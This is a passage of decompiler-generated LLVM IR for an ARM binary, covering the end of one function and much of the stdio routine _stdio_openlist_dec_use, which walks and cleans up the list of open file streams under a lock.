  %v9_162f4 = icmp eq i32 %v0_162fc, %v1_162f4
  br i1 %v9_162f4, label %dec_label_pc_162fc, label %dec_label_pc_162f4.dec_label_pc_162c4_crit_edge

dec_label_pc_162f4.dec_label_pc_162c4_crit_edge:  ; preds = %dec_label_pc_162f4
  %v0_162c4.pre = load i32, i32* @r7, align 4
  %v0_162cc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_162c4

dec_label_pc_162fc:                               ; preds = %dec_label_pc_162f4
  %v2_162fc = icmp ne i32 %v1_162f4, 0
  store i1 %v2_162fc, i1* %cpsr_c.global-to-local, align 1
  %v7_16300 = icmp slt i32 %v1_162f4, 2
  br i1 %v7_16300, label %dec_label_pc_1631c, label %dec_label_pc_16304

dec_label_pc_16304:                               ; preds = %dec_label_pc_162fc
  %v0_16308 = load i32, i32* %r1.global-to-local, align 4
  %v1_16308 = add i32 %v0_16308, 129
  store i32 %v1_16308, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1631c

dec_label_pc_1631c:                               ; preds = %dec_label_pc_162a8, %dec_label_pc_1628c, %dec_label_pc_16304, %dec_label_pc_162fc
  %v0_1631c = load i32, i32* %r8.global-to-local, align 4
  %v2_16320 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16320, i32* %r4.global-to-local, align 4
  store i32 %v6_1620c, i32* @r5, align 4
  store i32 %v9_1620c, i32* @r6, align 4
  store i32 %v12_1620c, i32* @r7, align 4
  store i32 %v15_1620c, i32* @r8, align 4
  store i32 %v24_1620c, i32* @lr, align 4
  ret i32 %v0_1631c

; uselistorder directives
  uselistorder i32 %v0_162f0, { 1, 0, 2 }
  uselistorder i32 %v1_162d4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_16290, { 1, 0 }
  uselistorder i32 %v0_16294, { 1, 0 }
  uselistorder i32 %v1_16250.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 11, 10, 0, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 11, 12, 4, 5, 6, 8, 7, 0, 9, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_1631c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_162f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_162dc, { 1, 0 }
  uselistorder label %dec_label_pc_1628c, { 1, 0 }
  uselistorder label %dec_label_pc_16280, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_16270, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16258, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16328 = load i32, i32* @r4, align 4
  store i32 %v3_16328, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r5.global-to-local, align 4
  %v4_16338 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 160) to i32*), align 4
  store i32 %v4_16338, i32* %r7.global-to-local, align 4
  %v0_1633c = call i32 @__aeabi_read_tp()
  store i32 %v0_1633c, i32* %r0.global-to-local, align 4
  %v1_16340 = add i32 %v4_16338, 8
  %v2_16340 = inttoptr i32 %v1_16340 to i32*
  %v3_16340 = load i32, i32* %v2_16340, align 4
  store i32 %v3_16340, i32* %r3.global-to-local, align 4
  %v1_16344 = add i32 %v0_1633c, -1168
  store i32 %v1_16344, i32* %r6.global-to-local, align 4
  %v3_16348 = icmp uge i32 %v3_16340, %v1_16344
  store i1 %v3_16348, i1* %cpsr_c.global-to-local, align 1
  %v9_16348 = icmp eq i32 %v3_16340, %v1_16344
  br i1 %v9_16348, label %dec_label_pc_16394, label %dec_label_pc_16354

dec_label_pc_16354:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16338, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1636093 = inttoptr i32 %v4_16338 to i32*
  %v2_1636094 = load i32, i32* %v1_1636093, align 4
  store i32 %v2_1636094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1636496 = icmp eq i32 %v2_1636094, 0
  br i1 %v9_1636496, label %dec_label_pc_1636c, label %dec_label_pc_16384

dec_label_pc_1636c:                               ; preds = %dec_label_pc_16354, %dec_label_pc_1636c.dec_label_pc_16360_crit_edge
  %v0_1636c97 = phi i32 [ %v1_16364.pre, %dec_label_pc_1636c.dec_label_pc_16360_crit_edge ], [ 0, %dec_label_pc_16354 ]
  store i32 %v0_1636c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1637c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1637c, label %dec_label_pc_16380, label %dec_label_pc_1636c.dec_label_pc_16360_crit_edge

dec_label_pc_1636c.dec_label_pc_16360_crit_edge:  ; preds = %dec_label_pc_1636c
  %v0_16360.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16364.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16360 = inttoptr i32 %v0_16360.pre to i32*
  %v2_16360 = load i32, i32* %v1_16360, align 4
  store i32 %v2_16360, i32* %r3.global-to-local, align 4
  %v3_16364 = icmp uge i32 %v2_16360, %v1_16364.pre
  store i1 %v3_16364, i1* %cpsr_c.global-to-local, align 1
  %v9_16364 = icmp eq i32 %v2_16360, %v1_16364.pre
  br i1 %v9_16364, label %dec_label_pc_1636c, label %dec_label_pc_16384

dec_label_pc_16380:                               ; preds = %dec_label_pc_1636c
  %v0_16380 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16380, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16384

dec_label_pc_16384:                               ; preds = %dec_label_pc_16354, %dec_label_pc_1636c.dec_label_pc_16360_crit_edge, %dec_label_pc_16380
  %v0_16384 = phi i32 [ %v0_16380, %dec_label_pc_16380 ], [ %v2_1636094, %dec_label_pc_16354 ], [ %v2_16360, %dec_label_pc_1636c.dec_label_pc_16360_crit_edge ]
  %v1_16384 = phi i32 [ %v0_16380, %dec_label_pc_16380 ], [ 0, %dec_label_pc_16354 ], [ %v1_16364.pre, %dec_label_pc_1636c.dec_label_pc_16360_crit_edge ]
  %v3_16384 = icmp uge i32 %v0_16384, %v1_16384
  store i1 %v3_16384, i1* %cpsr_c.global-to-local, align 1
  %v9_16384 = icmp eq i32 %v0_16384, %v1_16384
  br i1 %v9_16384, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_16384
  %v1_16388 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16388, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_16384, %bb
  %v1_1638c = xor i1 %v9_16384, true
  call void @__pseudo_cond_branch(i1 %v1_1638c, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_16390 = load i32, i32* %r6.global-to-local, align 4
  %v1_16390 = load i32, i32* %r7.global-to-local, align 4
  %v2_16390 = add i32 %v1_16390, 8
  %v3_16390 = inttoptr i32 %v2_16390 to i32*
  store i32 %v0_16390, i32* %v3_16390, align 4
  br label %dec_label_pc_16394

dec_label_pc_16394:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16398 = load i32, i32* %r5.global-to-local, align 4
  %v2_16398 = add i32 %v0_16398, 160
  %v3_16398 = inttoptr i32 %v2_16398 to i32*
  %v4_16398 = load i32, i32* %v3_16398, align 4
  store i32 %v4_16398, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_163a0 = add i32 %v0_16398, 12
  %v3_163a0 = inttoptr i32 %v2_163a0 to i32*
  %v4_163a0 = load i32, i32* %v3_163a0, align 4
  store i32 %v4_163a0, i32* %r3.global-to-local, align 4
  %v1_163a4 = inttoptr i32 %v4_163a0 to i32*
  %v2_163a4 = load i32, i32* %v1_163a4, align 4
  store i32 %v2_163a4, i32* %r1.global-to-local, align 4
  %v1_163a8 = add i32 %v4_16398, 4
  %v2_163a8 = inttoptr i32 %v1_163a8 to i32*
  %v3_163a8 = load i32, i32* %v2_163a8, align 4
  %v2_163ac = icmp ne i32 %v2_163a4, 0
  store i1 %v2_163ac, i1* %cpsr_c.global-to-local, align 1
  %v7_163ac = icmp eq i32 %v2_163a4, 1
  %v1_163b0 = add i32 %v3_163a8, 1
  store i32 %v1_163b0, i32* %r3.global-to-local, align 4
  store i32 %v1_163b0, i32* %v2_163a8, align 4
  br i1 %v7_163ac, label %dec_label_pc_163bc, label %dec_label_pc_16520

dec_label_pc_163bc:                               ; preds = %dec_label_pc_16394
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_163c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_163c0 = add i32 %v0_163c0, 80
  %v3_163c0 = inttoptr i32 %v2_163c0 to i32*
  %v4_163c0 = load i32, i32* %v3_163c0, align 4
  store i32 %v4_163c0, i32* %r3.global-to-local, align 4
  %v1_163c4 = inttoptr i32 %v4_163c0 to i32*
  %v2_163c4 = load i32, i32* %v1_163c4, align 4
  store i32 %v2_163c4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_163c4, 1
  br i1 %tmp46, label %dec_label_pc_16520, label %dec_label_pc_163d0

dec_label_pc_163d0:                               ; preds = %dec_label_pc_163bc
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_163d4 = add i32 %v0_163c0, 152
  %v3_163d4 = inttoptr i32 %v2_163d4 to i32*
  %v4_163d4 = load i32, i32* %v3_163d4, align 4
  store i32 %v4_163d4, i32* %r7.global-to-local, align 4
  %v1_163d8 = add i32 %v4_163d4, 8
  %v2_163d8 = inttoptr i32 %v1_163d8 to i32*
  %v3_163d8 = load i32, i32* %v2_163d8, align 4
  store i32 %v3_163d8, i32* %r3.global-to-local, align 4
  %v1_163dc = load i32, i32* %r6.global-to-local, align 4
  %v3_163dc = icmp uge i32 %v3_163d8, %v1_163dc
  store i1 %v3_163dc, i1* %cpsr_c.global-to-local, align 1
  %v9_163dc = icmp eq i32 %v3_163d8, %v1_163dc
  br i1 %v9_163dc, label %dec_label_pc_16420, label %dec_label_pc_163e4

dec_label_pc_163e4:                               ; preds = %dec_label_pc_163d0
  store i32 %v4_163d4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_163ec86 = inttoptr i32 %v4_163d4 to i32*
  %v2_163ec87 = load i32, i32* %v1_163ec86, align 4
  store i32 %v2_163ec87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_163f089 = icmp eq i32 %v2_163ec87, 0
  br i1 %v9_163f089, label %dec_label_pc_163f8, label %dec_label_pc_16410

dec_label_pc_163f8:                               ; preds = %dec_label_pc_163e4, %dec_label_pc_163f8.dec_label_pc_163ec_crit_edge
  %v0_163f890 = phi i32 [ %v1_163f0.pre, %dec_label_pc_163f8.dec_label_pc_163ec_crit_edge ], [ 0, %dec_label_pc_163e4 ]
  store i32 %v0_163f890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16408 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16408, label %dec_label_pc_1640c, label %dec_label_pc_163f8.dec_label_pc_163ec_crit_edge

dec_label_pc_163f8.dec_label_pc_163ec_crit_edge:  ; preds = %dec_label_pc_163f8
  %v0_163ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_163f0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_163ec = inttoptr i32 %v0_163ec.pre to i32*
  %v2_163ec = load i32, i32* %v1_163ec, align 4
  store i32 %v2_163ec, i32* %r3.global-to-local, align 4
  %v3_163f0 = icmp uge i32 %v2_163ec, %v1_163f0.pre
  store i1 %v3_163f0, i1* %cpsr_c.global-to-local, align 1
  %v9_163f0 = icmp eq i32 %v2_163ec, %v1_163f0.pre
  br i1 %v9_163f0, label %dec_label_pc_163f8, label %dec_label_pc_16410

dec_label_pc_1640c:                               ; preds = %dec_label_pc_163f8
  %v0_1640c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1640c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16410

dec_label_pc_16410:                               ; preds = %dec_label_pc_163e4, %dec_label_pc_163f8.dec_label_pc_163ec_crit_edge, %dec_label_pc_1640c
  %v0_16410 = phi i32 [ %v0_1640c, %dec_label_pc_1640c ], [ %v2_163ec87, %dec_label_pc_163e4 ], [ %v2_163ec, %dec_label_pc_163f8.dec_label_pc_163ec_crit_edge ]
  %v1_16410 = phi i32 [ %v0_1640c, %dec_label_pc_1640c ], [ 0, %dec_label_pc_163e4 ], [ %v1_163f0.pre, %dec_label_pc_163f8.dec_label_pc_163ec_crit_edge ]
  %v3_16410 = icmp uge i32 %v0_16410, %v1_16410
  store i1 %v3_16410, i1* %cpsr_c.global-to-local, align 1
  %v9_16410 = icmp eq i32 %v0_16410, %v1_16410
  br i1 %v9_16410, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_16410
  %v1_16414 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16414, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_16410, %bb47
  %v1_16418 = xor i1 %v9_16410, true
  call void @__pseudo_cond_branch(i1 %v1_16418, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_1641c = load i32, i32* %r6.global-to-local, align 4
  %v1_1641c = load i32, i32* %r7.global-to-local, align 4
  %v2_1641c = add i32 %v1_1641c, 8
  %v3_1641c = inttoptr i32 %v2_1641c to i32*
  store i32 %v0_1641c, i32* %v3_1641c, align 4
  %v0_16428.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16420

dec_label_pc_16420:                               ; preds = %dec_label_pc_163d0, %bb48
  %v0_16428 = phi i32 [ %v0_163c0, %dec_label_pc_163d0 ], [ %v0_16428.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_16428 = add i32 %v0_16428, 152
  %v3_16428 = inttoptr i32 %v2_16428 to i32*
  %v4_16428 = load i32, i32* %v3_16428, align 4
  store i32 %v4_16428, i32* %r0.global-to-local, align 4
  %v2_1642c = add i32 %v0_16428, 76
  %v3_1642c = inttoptr i32 %v2_1642c to i32*
  %v4_1642c = load i32, i32* %v3_1642c, align 4
  store i32 %v4_1642c, i32* %r2.global-to-local, align 4
  %v1_16430 = add i32 %v4_16428, 4
  %v2_16430 = inttoptr i32 %v1_16430 to i32*
  %v3_16430 = load i32, i32* %v2_16430, align 4
  store i32 %v3_16430, i32* %r3.global-to-local, align 4
  %v1_16434 = inttoptr i32 %v4_1642c to i32*
  %v2_16434 = load i32, i32* %v1_16434, align 4
  store i32 %v2_16434, i32* %r2.global-to-local, align 4
  %v1_16438 = add i32 %v3_16430, 1
  store i32 %v1_16438, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_16438, i32* %v2_16430, align 4
  %v0_16488.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1648811 = icmp eq i32 %v0_16488.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1648811, label %dec_label_pc_16494, label %dec_label_pc_1644c

dec_label_pc_1644c:                               ; preds = %dec_label_pc_16420, %dec_label_pc_16484
  %v0_164702 = phi i32 [ %v0_16484, %dec_label_pc_16484 ], [ %v0_16488.pr, %dec_label_pc_16420 ]
  %v1_1644c = inttoptr i32 %v0_164702 to i16*
  %v2_1644c = load i16, i16* %v1_1644c, align 2
  %v3_1644c = zext i16 %v2_1644c to i32
  store i32 %v3_1644c, i32* %r3.global-to-local, align 4
  %v2_16450 = and i32 %v3_1644c, 32816
  store i32 %v2_16450, i32* %r1.global-to-local, align 4
  %v2_16454 = icmp ugt i32 %v2_16450, 47
  store i1 %v2_16454, i1* %cpsr_c.global-to-local, align 1
  %v7_16454 = icmp eq i32 %v2_16450, 48
  %v1_16458 = add i32 %v0_164702, 32
  %v2_16458 = inttoptr i32 %v1_16458 to i32*
  %v3_16458 = load i32, i32* %v2_16458, align 4
  store i32 %v3_16458, i32* %r4.global-to-local, align 4
  br i1 %v7_16454, label %dec_label_pc_16464, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1644c
  store i32 %v0_164702, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16484

dec_label_pc_16464:                               ; preds = %dec_label_pc_1644c
  %v0_16464 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16464 = icmp eq i32 %v0_16464, 0
  br i1 %v2_16464, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_16464
  %v1_16468 = load i32, i32* %r5.global-to-local, align 4
  %v2_16468 = load i32, i32* %r7.global-to-local, align 4
  %v3_16468 = add i32 %v2_16468, %v1_16468
  %v4_16468 = inttoptr i32 %v3_16468 to i32*
  %v5_16468 = load i32, i32* %v4_16468, align 4
  store i32 %v5_16468, i32* %r3.global-to-local, align 4
  %v3_1646c = inttoptr i32 %v5_16468 to i32*
  store i32 %v3_16458, i32* %v3_1646c, align 4
  %v0_16470 = load i32, i32* %r2.global-to-local, align 4
  %v1_16470 = inttoptr i32 %v0_16470 to i16*
  %v2_16470 = load i16, i16* %v1_16470, align 2
  %v3_16470 = zext i16 %v2_16470 to i32
  store i32 %v3_16470, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_16464
  %v2_164708 = load i16, i16* %v1_1644c, align 2
  %v3_164709 = zext i16 %v2_164708 to i32
  store i32 %v3_164709, i32* %r3.global-to-local, align 4
  %v3_16474 = add i32 %v0_16464, 32
  %v4_16474 = inttoptr i32 %v3_16474 to i32*
  store i32 %v3_16458, i32* %v4_16474, align 4
  %v0_16478.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_16478 = phi i32 [ %v3_16470, %.thread ], [ %v0_16478.pre, %bb49 ]
  %v1_16478 = and i32 %v0_16478, 8192
  %v2_16478 = icmp eq i32 %v1_16478, 0
  br i1 %v2_16478, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1647c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1647c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_16480 = xor i1 %v2_16478, true
  call void @__pseudo_cond_branch(i1 %v1_16480, i32 ptrtoint (i32* @global_var_12d7c.33 to i32))
  %v0_16484.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16484

dec_label_pc_16484:                               ; preds = %.thread38, %bb52
  %v0_16484 = phi i32 [ %v0_16484.pre, %bb52 ], [ %v3_16458, %.thread38 ]
  store i32 %v0_16484, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16488 = icmp eq i32 %v0_16484, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16488, label %dec_label_pc_16494, label %dec_label_pc_1644c

dec_label_pc_16494:                               ; preds = %dec_label_pc_16484, %dec_label_pc_16420
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16498 = load i32, i32* %r5.global-to-local, align 4
  %v2_16498 = add i32 %v0_16498, 152
  %v3_16498 = inttoptr i32 %v2_16498 to i32*
  %v4_16498 = load i32, i32* %v3_16498, align 4
  store i32 %v4_16498, i32* %r0.global-to-local, align 4
  %v1_1649c = add i32 %v4_16498, 4
  %v2_1649c = inttoptr i32 %v1_1649c to i32*
  %v3_1649c = load i32, i32* %v2_1649c, align 4
  %v1_164a0 = add i32 %v3_1649c, -1
  store i32 %v1_164a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_164a4 = icmp eq i32 %v1_164a0, 0
  store i32 %v1_164a0, i32* %v2_1649c, align 4
  br i1 %v2_164a4, label %dec_label_pc_164b0, label %dec_label_pc_16510

dec_label_pc_164b0:                               ; preds = %dec_label_pc_16494
  %v0_164b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_164b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_164b0 = add i32 %v1_164b0, 8
  %v3_164b0 = inttoptr i32 %v2_164b0 to i32*
  store i32 %v0_164b0, i32* %v3_164b0, align 4
  %v0_164b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_164b4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_164b8

dec_label_pc_164b8:                               ; preds = %dec_label_pc_164e8.dec_label_pc_164b8_crit_edge, %dec_label_pc_164b0
  %v0_164b8 = phi i32 [ %v0_164b8.pre, %dec_label_pc_164e8.dec_label_pc_164b8_crit_edge ], [ %v0_164b4, %dec_label_pc_164b0 ]
  %v1_164b8 = inttoptr i32 %v0_164b8 to i32*
  %v2_164b8 = load i32, i32* %v1_164b8, align 4
  store i32 %v2_164b8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_164b8, i32* %r2.global-to-local, align 4
  %v2_164c474 = load i32, i32* %v1_164b8, align 4
  store i32 %v2_164c474, i32* %r3.global-to-local, align 4
  %v3_164c876 = icmp uge i32 %v2_164c474, %v2_164b8
  store i1 %v3_164c876, i1* %cpsr_c.global-to-local, align 1
  %v9_164c882 = icmp eq i32 %v2_164c474, %v2_164b8
  br i1 %v9_164c882, label %dec_label_pc_164d0, label %dec_label_pc_164e8

dec_label_pc_164d0:                               ; preds = %dec_label_pc_164b8, %dec_label_pc_164d0.dec_label_pc_164c4_crit_edge
  %v0_164d083 = phi i32 [ %v1_164c8.pre, %dec_label_pc_164d0.dec_label_pc_164c4_crit_edge ], [ %v2_164b8, %dec_label_pc_164b8 ]
  store i32 %v0_164d083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_164e0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_164e0, label %dec_label_pc_164e4, label %dec_label_pc_164d0.dec_label_pc_164c4_crit_edge

dec_label_pc_164d0.dec_label_pc_164c4_crit_edge:  ; preds = %dec_label_pc_164d0
  %v0_164c4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_164c8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_164c4 = inttoptr i32 %v0_164c4.pre to i32*
  %v2_164c4 = load i32, i32* %v1_164c4, align 4
  store i32 %v2_164c4, i32* %r3.global-to-local, align 4
  %v3_164c8 = icmp uge i32 %v2_164c4, %v1_164c8.pre
  store i1 %v3_164c8, i1* %cpsr_c.global-to-local, align 1
  %v9_164c8 = icmp eq i32 %v2_164c4, %v1_164c8.pre
  br i1 %v9_164c8, label %dec_label_pc_164d0, label %dec_label_pc_164e8

dec_label_pc_164e4:                               ; preds = %dec_label_pc_164d0
  %v0_164e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_164e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_164e8

dec_label_pc_164e8:                               ; preds = %dec_label_pc_164b8, %dec_label_pc_164d0.dec_label_pc_164c4_crit_edge, %dec_label_pc_164e4
  %v0_164f0 = phi i32 [ %v0_164e4, %dec_label_pc_164e4 ], [ %v2_164c474, %dec_label_pc_164b8 ], [ %v2_164c4, %dec_label_pc_164d0.dec_label_pc_164c4_crit_edge ]
  %v1_164e8 = phi i32 [ %v0_164e4, %dec_label_pc_164e4 ], [ %v2_164b8, %dec_label_pc_164b8 ], [ %v1_164c8.pre, %dec_label_pc_164d0.dec_label_pc_164c4_crit_edge ]
  %v3_164e8 = icmp uge i32 %v0_164f0, %v1_164e8
  store i1 %v3_164e8, i1* %cpsr_c.global-to-local, align 1
  %v9_164e8 = icmp eq i32 %v0_164f0, %v1_164e8
  br i1 %v9_164e8, label %dec_label_pc_164f0, label %dec_label_pc_164e8.dec_label_pc_164b8_crit_edge

dec_label_pc_164e8.dec_label_pc_164b8_crit_edge:  ; preds = %dec_label_pc_164e8
  %v0_164b8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_164b8

dec_label_pc_164f0:                               ; preds = %dec_label_pc_164e8
  %v2_164f0 = icmp ne i32 %v1_164e8, 0
  store i1 %v2_164f0, i1* %cpsr_c.global-to-local, align 1
  %v7_164f4 = icmp slt i32 %v1_164e8, 2
  br i1 %v7_164f4, label %dec_label_pc_16510, label %dec_label_pc_164f8

dec_label_pc_164f8:                               ; preds = %dec_label_pc_164f0
  %v0_164f8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_164f8, i32* %r0.global-to-local, align 4
  %v0_164fc = load i32, i32* %r1.global-to-local, align 4
  %v1_164fc = add i32 %v0_164fc, 129
  store i32 %v1_164fc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16510

dec_label_pc_16510:                               ; preds = %dec_label_pc_16494, %dec_label_pc_164f8, %dec_label_pc_164f0
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16514 = load i32, i32* %r5.global-to-local, align 4
  %v2_16514 = add i32 %v0_16514, 80
  %v3_16514 = inttoptr i32 %v2_16514 to i32*
  %v4_16514 = load i32, i32* %v3_16514, align 4
  store i32 %v4_16514, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1651c = inttoptr i32 %v4_16514 to i32*
  store i32 0, i32* %v2_1651c, align 4
  br label %dec_label_pc_16520

dec_label_pc_16520:                               ; preds = %dec_label_pc_16394, %dec_label_pc_163bc, %dec_label_pc_16510
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16524 = load i32, i32* %r5.global-to-local, align 4
  %v2_16524 = add i32 %v0_16524, 160
  %v3_16524 = inttoptr i32 %v2_16524 to i32*
  %v4_16524 = load i32, i32* %v3_16524, align 4
  store i32 %v4_16524, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1652c = add i32 %v0_16524, 12
  %v3_1652c = inttoptr i32 %v2_1652c to i32*
  %v4_1652c = load i32, i32* %v3_1652c, align 4
  store i32 %v4_1652c, i32* %r1.global-to-local, align 4
  %v1_16530 = add i32 %v4_16524, 4
  %v2_16530 = inttoptr i32 %v1_16530 to i32*
  %v3_16530 = load i32, i32* %v2_16530, align 4
  store i32 %v3_16530, i32* %r2.global-to-local, align 4
  %v1_16534 = inttoptr i32 %v4_1652c to i32*
  %v2_16534 = load i32, i32* %v1_16534, align 4
  %v1_16538 = add i32 %v3_16530, -1
  store i32 %v1_16538, i32* %r2.global-to-local, align 4
  %v1_1653c = add i32 %v2_16534, -1
  store i32 %v1_1653c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16540 = icmp eq i32 %v1_16538, 0
  store i32 %v1_1653c, i32* %v1_16534, align 4
  %v0_16548 = load i32, i32* %r2.global-to-local, align 4
  %v1_16548 = load i32, i32* %r0.global-to-local, align 4
  %v2_16548 = add i32 %v1_16548, 4
  %v3_16548 = inttoptr i32 %v2_16548 to i32*
  store i32 %v0_16548, i32* %v3_16548, align 4
  br i1 %v2_16540, label %dec_label_pc_16550, label %dec_label_pc_165b0

dec_label_pc_16550:                               ; preds = %dec_label_pc_16520
  %v0_16550 = load i32, i32* %r2.global-to-local, align 4
  %v1_16550 = load i32, i32* %r0.global-to-local, align 4
  %v2_16550 = add i32 %v1_16550, 8
  %v3_16550 = inttoptr i32 %v2_16550 to i32*
  store i32 %v0_16550, i32* %v3_16550, align 4
  %v0_16554 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16554, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16558

dec_label_pc_16558:                               ; preds = %dec_label_pc_16588.dec_label_pc_16558_crit_edge, %dec_label_pc_16550
  %v0_16558 = phi i32 [ %v0_16558.pre, %dec_label_pc_16588.dec_label_pc_16558_crit_edge ], [ %v0_16554, %dec_label_pc_16550 ]
  %v1_16558 = inttoptr i32 %v0_16558 to i32*
  %v2_16558 = load i32, i32* %v1_16558, align 4
  store i32 %v2_16558, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16558, i32* %r2.global-to-local, align 4
  %v2_1656462 = load i32, i32* %v1_16558, align 4
  store i32 %v2_1656462, i32* %r3.global-to-local, align 4
